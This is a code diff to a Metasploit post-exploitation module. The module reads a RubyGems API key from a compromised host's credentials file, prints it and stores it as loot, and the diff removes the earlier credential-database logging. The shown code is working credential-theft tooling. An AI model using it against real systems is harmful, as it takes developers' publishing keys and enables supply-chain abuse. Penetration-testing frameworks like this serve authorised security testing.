@@ -46,44 +46,20 @@ class Metasploit3 < Msf::Post
 
       if key = YAML.load(read_file(path))[:rubygems_api_key]
         rubygems_api_key = key
+      else
+        return
       end
 
-      print_good("Downloaded #{path}")
+      print_good("Found a RubyGems API Key: #{rubygems_api_key}")
 
-      store_loot("host.rubygems.apikey",
-                 "text/plain",
-                 session,
-                 rubygems_api_key,
-                 "ruby_api_key.txt",
-                 "Ruby API Key")
+      loot_path = store_loot("host.rubygems.apikey",
+                             "text/plain",
+                             session,
+                             rubygems_api_key,
+                             "ruby_api_key.txt",
+                             "Ruby API Key")
 
-      service_data = {
-        address: "rubygems.org",
-        port: 443,
-        service_name: 'rubygems',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
-      }
-
-      credential_data = {
-        origin_type: :session,
-        session_id: session_db_id,
-        post_reference_name: self.refname,
-        private_type: :password,
-        private_data: rubygems_api_key,
-        workspace_id: myworkspace_id
-      }
-
-      credential_core = create_credential(credential_data)
-
-      login_data = {
-        core: credential_core,
-        status: Metasploit::Model::Login::Status::UNTRIED,
-        workspace_id: myworkspace_id
-      }
-
-      login_data.merge!(service_data)
-      create_credential_login(login_data)
+      print_status("RubyGems API Key stored in: #{loot_path.to_s}")
     end
   end
 end
